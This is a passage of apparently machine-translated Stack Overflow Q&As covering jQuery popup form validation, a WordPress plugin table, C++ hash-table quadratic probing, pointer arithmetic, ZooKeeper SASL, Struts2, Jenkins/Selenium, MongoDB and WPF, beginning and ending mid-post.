                        <input type="submit" value="Register" name="submet" />
                        <a href="index.html" rel="login" class="linkform">You have an account already? Log in here</a>
                        <div class="clear"></div>
                    </div>
                </form> 
```

使用 jquery bpopup

```
 $(function() {

        // Binding a click event
        // From jQuery v.1.7.0 use .on() instead of .bind()
        $('#my-button').bind('click', function(e) {

            // Prevents the default action to be triggered. 
            e.preventDefault();

            // Triggering bPopup when click event is fired
            $('#element_to_pop_up').bPopup();

        });

    } 
```

所以当点击注册时，表单会弹出一切正常问题是我无法对表单进行验证，因为当我在填写表单后单击注册时，弹出窗口会消失，所以我无法在同一个表单上进行验证

我尝试 1 制作另一个显示错误的弹出窗口，但数据不会传递到新的弹出窗口 2 进行操作`$_SERVER['self_request']` 有人可以帮我解决这个问题吗 请我为我的大学有一个项目，我需要在 3 天内完成

我需要的是在将表单发送到 MySQL 脚本之前验证同一页面或另一个弹出窗口中的表单

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T05:47:10.553

制作一个使用 GET 函数获取信息的 php 页面（此处称为 validation.php）...

然后在输入字段上设置一些ID...

然后做一个这样的函数：

```
function checkAll(){
    var firstName = document.getElementById("f_name").value();
    var lastName = document.getElementById("l_name").value();
    $.get( "validation.php?f_name=" + firstName + "&l_name=" + lastName, function( response ) {
        // console.log( response ); // server response
        response = response.trim();
        if(response == 1){
            alert("Everything is alright");
        } else{
            alert(response);
            return false;
        }
    });
} 
```

并将您的表格更改为：

```
<form class="register" action="regist.php" method="post" onSubmit="checkAll();"> 
```

Now the key is that in the validation.php ,if everything works fine then you can echo value 1, and when something is not alright, you echo the error code ( or any code, and then with an switch clause you can dynamically add the error to your form).

The `return false` prevents the form from submitting...

# .net - IL 性能与其代码大小有关吗？

> ID：16184134
> 
> 赞同：0
> 
> 时间：2013-04-24T05:37:10.427
> 
> 标签：.net, performance, il

在查看中间语言时，每条指令都有特定的字节大小。

如果我有一个总代码大小（指令大小总和）为 10 个字节的方法和一个总代码大小为 20 个字节的方法，我可以假设第一个执行得更快吗？

我不知道如何将 IL 转换为机器代码，因此我认为性能会根据 IL 指令本身而有所不同，并且与其字节大小没有直接关系。

**IL的执行时间是否与其代码大小直接相关？**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-24T05:42:37.457

> IL的执行时间是否与其代码大小直接相关？

不，天真地，这似乎应该是真的，但它比现实中的要复杂得多。

视个别情况而定。这就是为什么不可能给出优化代码的“规则”。你不能天真地假设什么会更快。您只需测试目标架构上的各种选项，看看哪个选项实际上更快。

# php - 我的自定义表没有在 wordpress 插件激活时创建

> ID：16184143
> 
> 赞同：1
> 
> 时间：2013-04-24T05:37:45.487
> 
> 标签：php, wordpress

我正在尝试在插件激活时在 wordpress 数据库中创建自己的自定义表..这是我的代码..

```
function __construct()
    {
register_activation_hook(__FILE__,array(&$this, 'activate'));

    function activate()
    {

    global $wpdb;
    echo "<div class='updated'>Test Plugin Notice</div>";

    $table_name = $wpdb->prefix . "dive";

    $installed_ver = get_option( "divebook_db_table_dive_version" );
     //Check if the table already exists and if the table is up to date, if not create it
    if($wpdb->get_var("SHOW TABLES LIKE '$table_name'") != $table_name
            ||  $installed_ver != $divebook_db_table_dive_version ) {
        $sql = "CREATE TABLE " . $table_name . " (
              id mediumint(9) NOT NULL AUTO_INCREMENT,
              date bigint(11) DEFAULT '0' NOT NULL,
              site tinytext NOT NULL,
              description text NOT NULL,
              max_depth mediumint(9) NOT NULL,
              time mediumint(9) NOT NULL,
              UNIQUE KEY id (id)
            );";

        require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
        dbDelta($sql);
        update_option( "divebook_db_table_dive_version", $divebook_db_table_dive_version );

}
    //Add database table versions to options
    add_option("divebook_db_table_dive_version", $divebook_db_table_dive_version);

   }
} 
```

我正在检查我的数据库。没有创建新表..请查看它..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T05:39:35.663

这是因为任何 WP 激活/停用挂钩都需要从插件主文件内部运行，而不是从您包含在主文件中的文件中运行。因此，尝试从您的 plugin-name.php 文件运行激活钩子，它将起作用。

LE：
另外，我没有看到 $divebook_db_table_dive_version 被定义。另一件事，dbDelta 过去给我带来了问题，尝试使用 $wpdb->query() 来运行创建表查询。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-09-15T19:14:47.187

可能是因为 SQL 查询不正确，只需查看此处的文档 [https://codex.wordpress.org/Creating_Tables_with_Plugins](https://codex.wordpress.org/Creating_Tables_with_Plugins)

# c++ - 使用二次探测实现

> ID：16184145
> 
> 赞同：-4
> 
> 时间：2013-04-24T05:37:51.763
> 
> 标签：c++, hash

我有这段代码，我想使用二次探测方法重新实现它，我拥有的算法是 `i = (i + count) % CAPACITY;`. 我不确定我应该如何做到这一点，所以帮助会很好。我想你只会改变哈希函数和 next_index 函数，我不太确定。这是我需要重新实现的代码。顶部模板底部的头文件。

```
#ifndef TABLE1_H
#define TABLE1_H
#include <cstdlib>    // Provides size_t

namespace main_savitch_12A
{
template <class RecordType>
class table
{
public:
    // MEMBER CONSTANT -- See Appendix E if this fails to compile.
    static const std::size_t CAPACITY = 811;
    // CONSTRUCTOR
    table( );
    // MODIFICATION MEMBER FUNCTIONS
    void insert(const RecordType& entry);
    void remove(int key);
    // CONSTANT MEMBER FUNCTIONS
    bool is_present(int key) const;
    void find(int key, bool& found, RecordType& result) const;
    std::size_t size( ) const { return used; }
private:
    // MEMBER CONSTANTS -- These are used in the key field of special records.
    static const int NEVER_USED = -1;
    static const int PREVIOUSLY_USED = -2;
    // MEMBER VARIABLES
    RecordType data[CAPACITY];
    std::size_t used;
    // HELPER FUNCTIONS
    std::size_t hash(int key) const;
    std::size_t next_index(std::size_t index) const;
    void find_index(int key, bool& found, std::size_t& index) const;
    bool never_used(std::size_t index) const;
    bool is_vacant(std::size_t index) const;
};
}
 #include "table1.template" // Include the implementation.
 #endif
 //End Of Header

#include <cassert>  // Provides assert
#include <cstdlib>  // Provides size_t

namespace main_savitch_12A
{
template <class RecordType>
const std::size_t table<RecordType>::CAPACITY; 

template <class RecordType>
const int table<RecordType>::NEVER_USED;

template <class RecordType>
const int table<RecordType>::PREVIOUSLY_USED;

template <class RecordType>
table<RecordType>::table( )
{
    std::size_t i;

    used = 0;
    for (i = 0; i < CAPACITY; ++i)
        data[i].key = NEVER_USED;  // Indicates a spot that's never been used.
}

template <class RecordType>
void table<RecordType>::insert(const RecordType& entry)
// Library facilities used: cassert
{
    bool already_present;   // True if entry.key is already in the table
    std::size_t index;        // data[index] is location for the new entry

    assert(entry.key >= 0);

    // Set index so that data[index] is the spot to place the new entry.
    find_index(entry.key, already_present, index);

    // If the key wasn't already there, then find the location for the new entry.
    if (!already_present)
    {
        assert(size( ) < CAPACITY);
        index = hash(entry.key);
        while (!is_vacant(index))
            index = next_index(index);
        ++used;
    }

    data[index] = entry;
}

template <class RecordType>
void table<RecordType>::remove(int key)
// Library facilities used: cassert
{
    bool found;        // True if key occurs somewhere in the table
    std::size_t index;   // Spot where data[index].key == key

    assert(key >= 0);

    find_index(key, found, index);
    if (found)
    {   // The key was found, so remove this record and reduce used by 1.
        data[index].key = PREVIOUSLY_USED; // Indicates a spot that's no longer in use.
        --used;
    }
}

template <class RecordType>
bool table<RecordType>::is_present(int key) const
// Library facilities used: assert.h
{
    bool found;
    std::size_t index;

    assert(key >= 0);

    find_index(key, found, index);
    return found;
}

template <class RecordType>
void table<RecordType>::find(int key, bool& found, RecordType& result) const
// Library facilities used: cassert.h
{
    std::size_t index;

    assert(key >= 0);

    find_index(key, found, index);
    if (found)
        result = data[index];
}

template <class RecordType>
inline std::size_t table<RecordType>::hash(int key) const
{
    return (key % CAPACITY);
}

template <class RecordType>
inline std::size_t table<RecordType>::next_index(std::size_t index) const
// Library facilities used: cstdlib
{
    return ((index+1) % CAPACITY);
}

template <class RecordType>
void table<RecordType>::find_index(int key, bool& found, std::size_t& i) const
// Library facilities used: cstdlib
{
std::size_t count; // Number of entries that have been examined

count = 0;
i = hash(key);
while((count < CAPACITY) && (data[i].key != NEVER_USED) && (data[i].key != key))
{
    ++count;
    i = next_index(i);
}
found = (data[i].key == key);
}

template <class RecordType>
inline bool table<RecordType>::never_used(std::size_t index) const
{
return (data[index].key == NEVER_USED);
}

template <class RecordType>
inline bool table<RecordType>::is_vacant(std::size_t index) const
{
return (data[index].key == NEVER_USED) || (data[index].key == PREVIOUSLY_USED);
}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T05:48:51.713

使用此代码，您正在进行*线性探测*

```
 index = hash(entry.key);
    while (!is_vacant(index))
        index = next_index(index);

template <class RecordType>
inline std::size_t table<RecordType>::next_index(std::size_t index) const
// Library facilities used: cstdlib
{
    return ((index+1) % CAPACITY);
} 
```

假设您的地图快满了并且哈希返回 23，那么您要测试的下一个插槽将是 24、25、26、27 等。

二次探测的所有不同之处在于当插槽已满时要测试的插槽模式。再次假设 hash 返回 23，那么下一个要测试的 slot 是 23 + 1 = 24，下一个是 23 + 4 = 27，下一个是 23 + 9 = 32，下一个是 23 + 16 = 39。看到图案了吗？每次测试 23 + n*n。那是二次探测。当然，所有值都应该是 mod CAPACITY，就像您现在所做的那样。

换句话说，您不需要更改散列函数，只需插入内部的 while 循环。

# c++ - ++ 运算符在指针中的行为

> ID：16184151
> 
> 赞同：2
> 
> 时间：2013-04-24T05:38:23.927
> 
> 标签：c++, pointers

我有一个结构数组，我创建了一个指向结构中第一个元素的指针。我已经看到`++`我的代码中在指针上使用了运算符，例如：`ptrStruct++`，这到底是做什么的？转到下一个数组位置？还是用作运算符重载？

代码在这里，对象来自Ogre3D：

```
RGBA colours[nVertices];
RGBA *pColour = colours;
rs->convertColourValue(ColourValue(1.0,0.0,0.0), pColour++); //0 colour
rs->convertColourValue(ColourValue(1.0,1.0,0.0), pColour++); //1 colour
rs->convertColourValue(ColourValue(0.0,1.0,0.0), pColour++); //2 colour 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-24T05:42:10.550

`++`，当应用于指针时，将所述指针前进到下*一项。*它通过根据所指向的项目的大小进行缩放来做到这一点。

因此，如果您有一个`char *pc`指向位置`0x1000`，`pc++`将其推进到下一个`char`，或`0x1001`。但是，`int *pi`（假设`sizeof (int)`是`4`）将从位置前进`0x1000`到`0x1004`。

这不是您通常需要担心的事情，除非您在不同的指针之间进行转换。可以这么说：

```
RGBA colours[nVertices];
RGBA *pColour = colours;    // same as &(colours[0])
pColour++;                  //     now &(colours[1]) 
```

将简单地提前`pColour`指向`colours[1]`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-24T05:40:02.747

```
ptrStruct++ 
```

指针向前移动并指向数组中的下一个元素。编译器知道数组中每个元素的大小，然后每个元素`++`根据该大小在内存中推进指针。

```
RGBA colours[nVertices];  // Assume `sizeof(RGBA)` is 4bytes
RGBA *pColour = colours;

      sizeof(a[0])                                 
     <------------>                                
     +------------+------------+-------------+--------
     |            |            |             |     
     |   4bytes   |   4bytes   |   4bytes    |  4by...   
     |            |            |             |     
     +------------+------------+-------------+--------
     ^            ^                                
     |            |                                
   before       after++ 
   pColour      pColour 
```

作为一个`RGBA`大小为 4 的指针，每个都`++`对编译器说，向前推进 4 个字节。也就是说，单步的长度是4个字节。

此外，您可以重写代码如下：

```
RGBA colours[nVertices];
int i = 0;
rs->convertColourValue(ColourValue(1.0,0.0,0.0), colours[i++]);
rs->convertColourValue(ColourValue(1.0,1.0,0.0), colours[i++]);
rs->convertColourValue(ColourValue(0.0,1.0,0.0), colours[i++]); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-24T05:43:04.727

它将递增到数组中包含的下一个内存地址。实际上，`address + sizeof(array[0]).`这适用于任何（完整）类型。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-24T05:41:57.063

您已将指针声明为

```
RGBA *pColour = colours; 
```

所以做 pclour++ 意味着 pcolour + sizeof(RGBA)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-24T05:39:15.260

它将前进到列表中的下一个项目。我会将此作为评论，但我还不能。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-24T05:43:18.260

ptrStruct++ 将使 ptrStruct 指向数组中的下一个结构。

# apache-zookeeper - 如何在 Zookeeper 上启用 SASL 身份验证层？

> ID：16184152
> 
> 赞同：0
> 
> 时间：2013-04-24T05:38:32.957
> 
> 标签：apache-zookeeper

我是动物园管理员的新手。我在 Zookeeper 服务器中以独立模式创建了一个节点。这是代码片段。

```
public Connect(String hostPort, String znode, String filename) throws KeeperException, IOException, InterruptedException {
    this.filename = filename;
    zk = new ZooKeeper(hostPort, 3000, this);

    zk.create(znode, new byte[0],
            ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);
} 
```

现在，当我创建节点时（在上面的代码中），我想在 DIGEST-MD5 模式下使用 SASL 给出身份验证要求。我已在托管的 Zookeeper 服务器中成功配置了所需的[配置](https://cwiki.apache.org/ZOOKEEPER/zookeeper-and-sasl.html)，但尚未在 Client 中配置。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-29T04:12:33.590

我找到了一种为 zookeeper 节点启用 sasl 身份验证的方法。这是我使用的代码。

```
zk.addAuthInfo("digest", "admin:admin".getBytes()); 
```

# java - 当我被放置在“Java Resources\Libraries”文件夹下时，Struts 2 库无法识别，为什么？

> ID：16184157
> 
> 赞同：-1
> 
> 时间：2013-04-24T05:38:44.817
> 
> 标签：java, struts2

当我开发 Struts2 应用程序时，我得到了

> 异常启动过滤器 struts2 java.lang.ClassNotFoundException: org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter",

出于这个原因，我将过滤器更改为`FilterDispatcher`也。然后我也遇到了同样的错误。为此，我将相同的 jar 文件放在`WebContent\WEB-INF\lib`文件夹中，然后它工作正常。我不明白为什么会这样。任何一个帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T05:44:22.130

在运行时，网络服务器将从保存在目录中的 jars`WEB_INF\lib`和保存在目录中的其他类文件中获取类文件`WEB_INF\classes`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T07:17:43.650

我不确定你的类路径中有什么库。请看一下[Strut2 simple-setup](http://struts.apache.org/release/2.3.x/docs/simple-setup.html)，它解释了运行应用程序所需的所有依赖项。

或者从 Struts2 官方网站下载[示例应用程序](http://struts.apache.org/download.cgi#struts2314)并运行它的最佳方法，看看运行它需要什么。

`struts2-core.jar`尽管此错误可能是由于其他原因，但您似乎丢失了

# jenkins - 使用 jenkins 集成 Selenium 测试套件的问题

> ID：16184162
> 
> 赞同：0
> 
> 时间：2013-04-24T05:39:03.410
> 
> 标签：jenkins, selenium-rc

我正在尝试将 Jenkins 与 Selenium 集成。我准备了以下命令：

```
java -jar "D:\CI\TWCP\Selenium plugins\selenium-server-standalone-2.32.0.jar" -htmlSuite *firefox "http://www.google.co.in"  "C:\Users\....\Desktop\Test suites\GoogleTestSuite.html" "C:\Users\.....\Desktop\results.html" -firefoxProfileTemplate "C:\....\Mozilla\Firefox\Profiles\s980v5zn.default" 
```

当我在命令行中执行命令时，它工作得非常好。然后我通过 Jenkins 调用了相同的命令，我得到了以下错误：

```
 Started by user anonymous
Building in workspace D:\CI\Jenkins\jobs\Google Test\workspace
[workspace] $ cmd /c call C:\Windows\TEMP\hudson600399625489206831.bat

D:\CI\Jenkins\jobs\Google Test\workspace>java -jar "D:\CI\TWCP\Selenium plugins\selenium-server-standalone-2.32.0.jar" -htmlSuite *firefox "http://www.google.co.in"  "C:\Users\N_chandanKumar\Desktop\Test suites\GoogleTestSuite.html" "C:\Users\N_chandanKumar\Desktop\results.html" -firefoxProfileTemplate "C:\Users\N_chandanKumar\AppData\Roaming\Mozilla\Firefox\Profiles\s980v5zn.default" 
Apr 24, 2013 10:54:07 AM org.openqa.grid.selenium.GridLauncher main
INFO: Launching a standalone server
10:54:08.647 INFO - Java: Sun Microsystems Inc. 1.6.0-b105
10:54:08.647 INFO - OS: Windows Vista 6.1 x86
10:54:08.662 INFO - v2.32.0, with Core v2.32.0\. Built from revision 6c40c18
10:54:08.756 INFO - RemoteWebDriver instances should connect to: http://127.0.0.1:4444/wd/hub
10:54:08.756 INFO - Version Jetty/5.1.x
10:54:08.756 INFO - Started HttpContext[/selenium-server/driver,/selenium-server/driver]
10:54:08.756 INFO - Started HttpContext[/selenium-server,/selenium-server]
10:54:08.756 INFO - Started HttpContext[/,/]
10:54:08.787 INFO - Started org.openqa.jetty.jetty.servlet.ServletHandler@13c1b02
10:54:08.787 INFO - Started HttpContext[/wd,/wd]
10:54:08.787 INFO - Started SocketListener on 0.0.0.0:4444
10:54:08.787 INFO - Started org.openqa.jetty.jetty.Server@7ced01
jar:file:/D:/CI/TWCP/Selenium%20plugins/selenium-server-standalone-2.32.0.jar!/customProfileDirCUSTFFCHROME
10:54:09.941 INFO - Preparing Firefox profile...
10:54:12.041 INFO - Launching Firefox...
10:54:14.242 INFO - Checking Resource aliases
10:54:37.079 INFO - Checking Resource aliases
10:54:37.079 INFO - Received posted results
GoogleTestCase.html
<a href="GoogleTestCase.html">GoogleTestCase</a></td></tr>
</tbody></table>

10:54:37.297 INFO - Killing Firefox...
Tests failed, see result file for details: C:\Users\N_chandanKumar\Desktop\results.html
10:54:37.921 INFO - Shutting down...
10:54:37.921 INFO - Stopping Acceptor ServerSocket[addr=0.0.0.0/0.0.0.0,port=0,localport=4444]

D:\CI\Jenkins\jobs\Google Test\workspace>exit 1 
Build step 'Execute Windows batch command' marked build as failure
Finished: FAILURE 
```

result.html 显示失败，日志如下

```
info: Starting test /selenium-server/tests/GoogleTestCase.html
info: Executing: |setTimeout | 1000000 |  |
info: Executing: |openAndWait | http://www.google.co.in/ |  |
info: Executing: |setTimeout | 1000000 |  |
info: Executing: |pause | 20000 |  |
info: Executing: |verifyTextPresent | India |  |
warn: currentTest.recordFailure: false
info: Executing: |assertTitle | Google |  |
error: Actual value &apos;Error Message&apos; did not match &apos;Google&apos;
warn: currentTest.recordFailure: Actual value &apos;Error Message&apos; did not match &apos;Google&apos; 
```

如果我运行相同的代码添加**调试**标签，即

```
java -jar "D:\CI\TWCP\Selenium plugins\selenium-server-standalone-2.32.0.jar" -htmlSuite *firefox "http://www.google.co.in"  "C:\Users\....\Desktop\Test suites\GoogleTestSuite.html" "C:\Users\....\Desktop\results.html" -firefoxProfileTemplate "C:\Users\.....\AppData\Roaming\Mozilla\Firefox\Profiles\s980v5zn.default" -debug 
```

我最后得到以下日志

```
GoogleTestCase.html
<a href="GoogleTestCase.html">GoogleTestCase</a></td></tr>
</tbody></table>

10:58:56.737 DEBUG - Handled by org.openqa.selenium.server.htmlrunner.SeleniumHTMLRunnerResultsHandler@14b7453
10:58:56.737 DEBUG - RESPONSE:
HTTP/1.1 200 OK
Date: Wed, 24 Apr 2013 05:28:56 GMT
Server: Jetty/5.1.x (Windows Vista/6.1 x86 java/1.6.0
Cache-Control: no-cache
Pragma: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Content-Type: text/html
Transfer-Encoding: chunked

10:58:57.002 INFO - Killing Firefox...
10:58:57.018 DEBUG - java.net.SocketException: Connection reset
10:58:57.018 DEBUG - java.net.SocketException: Connection reset
10:58:57.018 DEBUG - java.net.SocketException: Connection reset
10:58:57.018 DEBUG - java.net.SocketException: Connection reset
10:58:57.033 DEBUG - java.net.SocketException: Connection reset
10:58:57.033 DEBUG - java.net.SocketException: Connection reset
Tests failed, see result file for details: C:\Users\N_chandanKumar\Desktop\results.html
D:\CI\Jenkins\jobs\Google Test\workspace>exit 1 
Build step 'Execute Windows batch command' marked build as failure
Finished: FAILURE 
```

我有詹金斯 1.509 和 seleniumHQ2.32.0

无法弄清楚我是如何得到**“java.net.SocketException：连接重置”**的任何这方面的帮助将不胜感激。

谢谢和问候， CK

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-03T09:51:30.420

为了检查这个问题，我在交互模式下运行了 jenkins 服务器。当您转到 services.msc -> Jenkins 进程 -> 属性-> 单击登录选项卡时可以看到该设置，您可以选择本地系统帐户并勾选“允许服务与桌面交互”。

这使得 jenkins 以交互方式运行 selenium 测试，而不是在后台运行。

在那里我可以观察到浏览器无法打开网站。这是通过设置 services.msc -> Jenkins 进程 -> 属性 -> 单击登录选项卡 -> 选择此帐户并提供您用于登录此系统的帐户来解决的。

# mongodb - spring mongodbtemplate如何检查对象是否已经存在

> ID：16184170
> 
> 赞同：0
> 
> 时间：2013-04-24T05:39:37.280
> 
> 标签：mongodb, spring-mongo

我在spring mongo的mongdbtemplate中使用save方法（下面提供了api链接）。

[http://static.springsource.org/spring-data/mongodb/docs/1.2.x/api/org/springframework/data/mongodb/core/MongoTemplate.html#save(java.lang.Object](http://static.springsource.org/spring-data/mongodb/docs/1.2.x/api/org/springframework/data/mongodb/core/MongoTemplate.html#save(java.lang.Object) , java.lang.细绳）

我试图了解 mongdbtemplate 如何检查对象是否已经存在。我假设它对传递​​的对象使用 equals 方法，如果不是这样，请告诉我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T02:32:45.573

mongodbtemplate 内部没有使用魔法代码。MongoDB 原生支持**[upsert](http://docs.mongodb.org/manual/core/update/#update-operations-with-the-upsert-flag)**的概念。

# c# - ItemContainerGenerator.ContainerFromItem() 返回 null 而 VirtualizingStackPanel.IsVirtualizing="False"

> ID：16184172
> 
> 赞同：5
> 
> 时间：2013-04-24T05:39:47.260
> 
> 标签：c#, wpf, combobox, null, itemcontainergenerator

我在[这个问题](https://stackoverflow.com/questions/6713365/itemcontainergenerator-containerfromitem-returns-null/16175021#16175021)上遇到了类似的问题，但`VirtualizingStackPanel.IsVirtualizing="False"`没有解决我的问题。有没有人面临同样的问题？

问题是我有一个自定义组合框，

```
<Style TargetType="{x:Type MultiSelectionComboBox}"  >
    <Setter Property="VerticalContentAlignment" Value="Center"/>
    <Setter Property="ItemsPanel">
        <Setter.Value>
            <ItemsPanelTemplate>
                <StackPanel Orientation="Vertical"
                VerticalAlignment="Center"
                HorizontalAlignment="Center"
                VirtualizingStackPanel.IsVirtualizing="False"/>
            </ItemsPanelTemplate>
        </Setter.Value>
    </Setter>
    <Setter Property="ItemTemplate">
        <Setter.Value>
            <DataTemplate>
                <StackPanel Orientation="Horizontal" x:Name="ItemStack" VirtualizingStackPanel.IsVirtualizing="False">
                    <CheckBox x:Name="CheckBoxItem"
                        Command="{Binding SelectItem, RelativeSource={RelativeSource AncestorType={x:Type MultiSelectionComboBox}}}"
                        CommandParameter="{Binding Key}"
                              >
                    </CheckBox>
                    <TextBlock Text="{Binding DisplayText}"></TextBlock>
                </StackPanel>
            </DataTemplate>
        </Setter.Value>
    </Setter>
    <Setter Property="Template">
        <Setter.Value>
            <ControlTemplate TargetType="{x:Type ComboBox}">
                <Grid x:Name="Placement" SnapsToDevicePixels="true">
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="*"/>
                        <ColumnDefinition Width="Auto"/>
                    </Grid.ColumnDefinitions>
                    <Border BorderThickness="1" BorderBrush="Black">
                        <TextBox IsReadOnly="True" Grid.Column="0" 
                                 Text="{Binding Text, UpdateSourceTrigger=PropertyChanged, RelativeSource={RelativeSource AncestorType={x:Type MultiSelectionComboBox}}}">
                        </TextBox>
                    </Border>
                    <Popup x:Name="PART_Popup" 
                               Grid.Column="0"
                               Focusable="False"
                               Grid.ColumnSpan="2"
                               IsOpen="{Binding IsDropDownOpen, RelativeSource={RelativeSource TemplatedParent}, Mode=TwoWay}"
                               Placement="Bottom"
                               VerticalOffset="-1"
                               PlacementTarget="{Binding ElementName=LayoutRoot}">
                        <Popup.Resources>
                            <Style TargetType="{x:Type ScrollBar}" BasedOn="{StaticResource {x:Type ScrollBar}}">
                                <Style.Triggers>
                                    <Trigger Property="Orientation" Value="Vertical">
                                        <Setter Property="BorderThickness" Value="0"/>
                                    </Trigger>
                                </Style.Triggers>
                            </Style>
                        </Popup.Resources>
                        <ScrollViewer x:Name="DropDownScrollViewer"
                                          Background="{StaticResource Background}"
                                          BorderBrush="{TemplateBinding BorderBrush}"
                                          BorderThickness="{TemplateBinding BorderThickness}"
                                          MinWidth="{Binding ActualWidth, ElementName=LayoutRoot}"
                                          MaxHeight="{TemplateBinding MaxDropDownHeight}">
                            <ItemsPresenter KeyboardNavigation.DirectionalNavigation="Contained"/>
                        </ScrollViewer>
                    </Popup>
                    <ToggleButton IsEnabled="{Binding IsEnabled, UpdateSourceTrigger=PropertyChanged, RelativeSource={RelativeSource AncestorType={x:Type MultiSelectionComboBox}}}" Grid.Column="1" IsChecked="{Binding IsDropDownOpen, Mode=TwoWay, RelativeSource={RelativeSource TemplatedParent}}" Style="{StaticResource ComboBoxToggleButton}"/>
                </Grid>
            </ControlTemplate>
        </Setter.Value>
    </Setter>
</Style>
</ResourceDictionary> 
```

但我无法通过内部获得对复选框的引用，

```
this.ItemContainerGenerator.ContainerFromItem(this.Items[0]) as ComboBoxItem; 
```

有什么建议吗？

我真正想要实现的是，

我想更改 checkboxes ischecked 属性，该属性取决于可以在运行时更改的其他对象。由于整个项目的当前状态，我目前无法更改，因此我无法使用绑定来做到这一点。所以基本上一旦创建了新的 MultiSelectionComboBox 我想做这样的事情，

```
foreach (object item in this.Items)
{
    ComboBoxItem comboBoxItem = this.ItemContainerGenerator.ContainerFromItem(item) as ComboBoxItem;
    if (comboBoxItem == null)
        continue;
    FrameworkElement element = comboBoxItem.ContentTemplate.LoadContent() as FrameworkElement;
    CheckBox checkBox = element.FindName("CheckBoxItem") as CheckBox;
    checkBox.IsChecked = this.SelectedItem.Contains(item);
} 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2014-02-21T12:27:25.753

尝试执行`UpdateLayout()`之前`this.ItemContainerGenerator.ContainerFromItem(item)`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-04-03T09:38:15.040

使用 ComboBox 中的 ItemContainerGenerator.StatusChanged 事件，如下所示：

```
myComboBox.ItemContainerGenerator.StatusChanged += ItemContainerGenerator_StatusChanged;

void ItemContainerGenerator_StatusChanged(object sender, System.EventArgs e)
{
    if (myComboBox.ItemContainerGenerator.Status == GeneratorStatus.ContainersGenerated)
    {
        foreach (var item in myComboBox.Items)
        {
            var container = (ComboBoxItem)LanguageComboBox.ItemContainerGenerator.ContainerFromItem(item);
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-08-08T15:52:31.593

由于我的逻辑是在 SelectionChanged 事件中，我想知道为什么该`ItemContainerGenerator.ContainerFromItem`方法总是返回 null，即使它`Listbox.SelectedItem`不为 null，更奇怪的是，虚拟化已关闭！看着`ItemContainerGenerator.Status`我看到它`Primitives.GeneratorStatus.NotStarted`然后我添加了一个简单的测试`ItemContainerGenerator.Status == Primitives.GeneratorStatus.ContainersGenerated`并最终以这种方式解决了它，无需订阅 Status_Changed 事件。

# javascript - 如果行值为负，则更改行颜色

> ID：16184180
> 
> 赞同：1
> 
> 时间：2013-04-24T05:40:22.500
> 
> 标签：javascript, jquery, html, css

我有一张表，我必须在其中突出显示负值。所以我尝试使用 jQuery 并没有得到我想要的输出。假设我有一张这样的桌子。

```
<table border="1" cellpadding="4" cellspacing="4">
    <tr class="alt">
        <td class="status">1</div>
        <td class>Received</div>
    </tr>
    <tr class="alt">
        <td class="status">-50</div>
        <td class>Received</div>
    </tr>
    <tr class="alt">
        <td class="status">0</div>
        <td class>Received</div>
    </tr>
    <tr class="alt">
        <td class="status">20</div>
        <td class>Received</div>
    </tr>
</table> 
```

我正在使用 jQuery。但它不起作用。

```
$(document).ready(function(){
    $("tr.alt:even").css("background-color", "#f0f8ff");
    $("tr.alt:odd").css("background-color", "#fcfceb");
});

$(document).ready(function() {
    $(.status.val()<0).closest('tr.alt').css('background-color', '#cd0000');
    $(td.status[value<0]).css('background-color', 'red');
}); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-24T05:43:50.433

尝试

```
$(document).ready(function() {

   $( ".status" ).each(function(){
       var value = parseInt( $( this ).html() );
       if ( value < 0 )
       {
           $( this ).parent().css('background-color', 'red');
       }
   });
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-24T05:48:13.147

您也可以按以下方式进行。

正如你所说的数字变为负数，那么你也可以检查`-`登录 html。

```
$('tr.alt td:contains("-")').parent('tr').css('background-color', '#cd0000'); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-24T05:50:26.113

您可以在 jQuery中使用[filter()函数](http://api.jquery.com/filter/)

[JSFiddle](http://jsfiddle.net/KJVak/)

HTML

```
<table border="1" cellpadding="4" cellspacing="4">
    <tr class="alt">
        <td class="status">1</td>
        <td class>Received</td>
    </tr>
    <tr class="alt">
        <td class="status">-50</td>
        <td class>Received</td>
    </tr>
    <tr class="alt">
        <td class="status">0</td>
        <td class>Received</td>
    </tr>
    <tr class="alt">
        <td class="status">20</td>
        <td class>Received</td>
    </tr>
</table> 
```

jQuery

```
$(document).ready(function() {
   $( ".status" )
      .filter(function(){
         return $(this).html() < 0;
      })
      .parent().css('background-color', 'red');
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-24T05:49:05.803

你的选择器有问题..

试试这个

```
 $(document).ready(function()
 {
   $("tr.alt:even").css("background-color", "#f0f8ff");
   $("tr.alt:odd").css("background-color", "#fcfceb");
   $('.status').each(function(){
      var $this =$(this); 
     if($this.text() < 0){
        $this.parent().css('background-color', '#cd0000');
        $this.css('background-color', 'red');
     } 
  }) 

}); 
```

或使用过滤器（）

```
 $(document).ready(function()
 {
